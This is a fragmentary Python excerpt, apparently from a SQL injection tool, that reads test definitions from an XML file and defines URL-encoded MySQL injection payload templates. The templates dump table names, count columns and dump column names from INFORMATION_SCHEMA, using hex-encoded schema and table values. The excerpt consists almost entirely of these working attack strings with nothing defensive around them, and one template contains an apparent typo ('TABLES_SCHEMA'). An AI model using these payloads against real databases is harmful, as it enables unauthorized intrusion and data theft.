...
parser = et.parse('tests.xml')
queries = parser.findall('test[1]')
for query in queries:
    test = query.find('title').text
...
TBL_DUMP_FROM_DBS = ("(SELECT%%20CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA=0x%s)LIMIT%%200,1)",
...
COL_COUNT_FROM_TBL = ("(SELECT%%20COUNT(*)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLES_SCHEMA=0x%s)AND(TABLE_NAME=0x%s))",
...
COL_DUMP_FROM_TBL = ("(SELECT%%20CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA=0x%s)AND(TABLE_NAME=0x%s)LIMIT%%200,1)",
